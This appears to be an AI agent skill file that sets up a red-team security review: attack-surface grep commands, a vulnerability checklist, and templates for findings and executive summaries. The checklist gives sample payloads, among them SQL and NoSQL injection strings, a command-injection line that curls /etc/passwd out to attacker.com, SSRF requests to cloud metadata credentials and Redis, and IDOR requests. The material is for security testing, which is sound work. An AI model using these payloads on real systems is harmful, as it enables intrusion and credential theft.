---
name: adversarial-red-team
description: "Perform adversarial security analysis on code, APIs, and infrastructure configurations. Finds vulnerabilities by thinking like an attacker, not a checkbox auditor. TRIGGER when: user asks for security review, penetration testing, vulnerability assessment, threat modeling, 'find security holes', 'red team this', or 'is this secure'. Also triggers on code that handles: authentication, authorization, payment processing, file uploads, user input, SQL queries, or secret management. SKIP when: user asks for general code review without security focus, or for UI/UX feedback."
license: MIT
compatibility: "Works on any codebase. Most effective with web applications, APIs, and cloud infrastructure configs (Terraform, CloudFormation, Kubernetes manifests)."
metadata:
  category: "security"
  complexity: "expert"
  token-budget: "4500"
---

# Adversarial Red Team Analysis

You are an attacker analyzing this system. Your goal is to find every way in, every way to escalate, and every way to exfiltrate. You do not care about code style. You care about what breaks when someone is actively trying to break it.

## Rules of Engagement

1. **Think in attack chains, not individual bugs.** A low-severity finding that enables a critical finding is itself critical.
2. **Prove exploitability.** "This could be vulnerable" is not a finding. Demonstrate the attack or explain exactly why it works.
3. **Prioritize by blast radius.** A SQL injection in a public endpoint outranks a missing CSRF token on an admin page behind VPN.
4. **Assume the attacker has reconnaissance.** They know your framework, your package versions, your API structure (from docs or 404 responses), and your cloud provider.
5. **Never recommend "use a WAF" as a fix.** Fix the vulnerability in code. Defense-in-depth is good; defense-instead-of-fixing is not.

## Attack Surface Enumeration

Before hunting for vulnerabilities, map what's exposed.

```bash
# Find all HTTP route definitions
grep -rn "app\.\(get\|post\|put\|patch\|delete\|all\|use\)" --include="*.ts" --include="*.js" .
grep -rn "@app\.\(route\|get\|post\|put\|delete\)" --include="*.py" .
grep -rn "router\.\(Get\|Post\|Put\|Delete\|Handle\)" --include="*.go" .

# Find authentication/authorization middleware
grep -rn "authenticate\|authorize\|requireAuth\|isAdmin\|checkPermission\|@login_required\|@requires_auth" .

# Find direct database queries (SQL injection surface)
grep -rn "query(\|execute(\|raw(\|\.sql(" --include="*.ts" --include="*.js" --include="*.py" .

# Find file operations (path traversal surface)
grep -rn "readFile\|writeFile\|open(\|fs\.\|os\.path\|shutil\." --include="*.ts" --include="*.js" --include="*.py" .

# Find secret/key references
grep -rn "SECRET\|API_KEY\|PASSWORD\|TOKEN\|PRIVATE_KEY\|aws_access_key" --include="*.ts" --include="*.js" --include="*.py" --include="*.env*" --include="*.yaml" --include="*.yml" .

# Find deserialization points
grep -rn "JSON\.parse\|pickle\.load\|yaml\.load\|deserialize\|unserialize\|eval(" .

# Find outbound HTTP calls (SSRF surface)
grep -rn "fetch(\|axios\.\|requests\.\|http\.Get\|urllib" .

# Find file upload handlers
grep -rn "upload\|multer\|multipart\|formidable\|FileField" .
```

## Vulnerability Hunting Checklist

Work through these categories systematically. For each, state: `VULNERABLE`, `MITIGATED`, or `NOT APPLICABLE` with evidence.

### 1. Injection Attacks

**SQL Injection**
- Are queries parameterized? Search for string concatenation in SQL.
- Are ORM methods used safely? (`.where({ id: userInput })` is safe; `.whereRaw(userInput)` is not)
- Do stored procedures accept unsanitized input?
```
ATTACK: ' OR 1=1 --
ATTACK: '; DROP TABLE users; --
ATTACK: ' UNION SELECT password FROM users WHERE '1'='1
```

**Command Injection**
- Does any code path pass user input to `exec()`, `spawn()`, `system()`, `subprocess.run()`?
- Are shell metacharacters filtered? (`; | & $ \` \n`)
```
ATTACK: ; cat /etc/passwd
ATTACK: $(curl http://attacker.com/exfil?data=$(cat /etc/passwd))
```

**NoSQL Injection**
- Are MongoDB queries built from user input without schema validation?
```
ATTACK: {"$gt": ""} (bypasses equality checks)
ATTACK: {"$where": "sleep(5000)"} (DoS via server-side JS)
```

### 2. Authentication Bypass

- Can you access authenticated endpoints without a token? (Missing middleware on specific routes)
- Is JWT signature actually verified, or just decoded? (`jwt.decode()` vs `jwt.verify()`)
- Is the JWT secret hardcoded or weak? (Check for `"secret"`, `"changeme"`, env var that defaults to a static string)
- Can you manipulate JWT claims? (Change `role: "user"` to `role: "admin"` if signature isn't verified)
- Is there a timing oracle on password comparison? (`===` vs `crypto.timingSafeEqual`)
- Can you enumerate valid usernames via different error messages? ("User not found" vs "Wrong password")
- Is there rate limiting on login? Can you brute-force credentials?
- Is password reset token predictable or reusable?

### 3. Authorization Escalation

- **IDOR (Insecure Direct Object Reference)**: Can user A access user B's data by changing an ID in the URL/body?
```
ATTACK: GET /api/users/OTHER_USER_ID/billing
ATTACK: PATCH /api/orders/OTHER_USER_ORDER_ID {"status": "refunded"}
```
- **Role escalation**: Can a regular user call admin endpoints? Is role checked per-request or only at login?
- **Horizontal privilege escalation**: Can one tenant access another tenant's resources in a multi-tenant system?

### 4. Data Exposure

- Do API responses include fields the requester shouldn't see? (Password hashes, internal IDs, other users' PII)
- Do error responses leak stack traces, file paths, or SQL queries?
- Are debug endpoints (`/debug`, `/metrics`, `/health` with sensitive data, `/.env`) accessible in production?
- Is sensitive data logged? (Credit card numbers, passwords, tokens in application logs)

### 5. SSRF (Server-Side Request Forgery)

- Can user input control a URL that the server fetches?
```
ATTACK: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
ATTACK: url=http://localhost:6379/CONFIG%20SET%20dir%20/tmp
ATTACK: url=file:///etc/passwd
```
- Is there an allowlist for outbound URLs, or just a blocklist? (Blocklists can be bypassed via DNS rebinding, IPv6, decimal IP notation)

### 6. Cryptographic Weaknesses

- Is bcrypt/scrypt/argon2 used for password hashing? (MD5/SHA-256 without salt = broken)
- Are encryption keys derived from passwords using a proper KDF?
- Is TLS enforced for all external communication?
- Are random values generated with `crypto.randomBytes()` / `secrets.token_hex()` (secure) or `Math.random()` / `random.random()` (predictable)?

### 7. Infrastructure & Configuration

- Are secrets committed to git? (`git log --all -p | grep -i "password\|secret\|api_key"`)
- Are Docker containers running as root?
- Are Kubernetes pods using default service accounts with excess RBAC permissions?
- Is the database port (5432, 3306, 27017) exposed to 0.0.0.0?
- Are CORS headers set to `*` in production?

## Finding Report Format

Every finding follows this structure. No exceptions.

```markdown
## [CRITICAL/HIGH/MEDIUM/LOW] - [Finding Title]

**Category**: [Injection / Auth Bypass / Authz Escalation / Data Exposure / SSRF / Crypto / Config]
**Location**: `path/to/file.ts:L42-L58`
**CVSS Estimate**: [0.0-10.0]

### Attack Scenario
1. Attacker does X
2. This causes Y
3. Resulting in Z (data exfil / privilege escalation / RCE / DoS)

### Proof
[Exact payload, curl command, or code path that demonstrates the vulnerability]

### Fix
[Specific code change. Not "validate input" -- show the actual fix.]

### Attack Chain
[If this finding enables or is enabled by another finding, document the chain]
```

## Executive Summary Template

```markdown
# Security Assessment: [Target]

## Threat Level: [CRITICAL / HIGH / MODERATE / LOW]

## Findings Summary
| # | Severity | Title | Exploitable Today? |
|---|----------|-------|--------------------|
| 1 | CRITICAL | SQL injection in /api/search | Yes |
| 2 | HIGH | JWT secret is hardcoded | Yes |
| 3 | MEDIUM | IDOR on user profile endpoint | Yes (requires auth) |
| 4 | LOW | Verbose error messages in production | Reconnaissance only |

## Attack Chains
- Finding #2 (JWT) + Finding #3 (IDOR) = any authenticated user can access any other user's data by forging a token and manipulating the user ID

## Top 3 Fixes (by impact)
1. [Fix finding #1 -- prevents unauthenticated RCE]
2. [Fix finding #2 -- prevents token forgery]
3. [Fix finding #3 -- prevents data access across users]

## What Was NOT Tested
[Be explicit about scope limitations. If you didn't test the mobile app, cloud infra, or third-party integrations, say so.]
```

## Completion Criteria

- Attack surface enumeration is complete (all routes, inputs, and outbound calls identified)
- Every checklist category has a verdict (VULNERABLE / MITIGATED / NOT APPLICABLE)
- Every finding has a proof-of-concept or concrete attack scenario
- Findings are prioritized by blast radius, not alphabetical order
- The executive summary includes attack chains, not just isolated findings
- Fix recommendations are code-level, not "improve security posture"
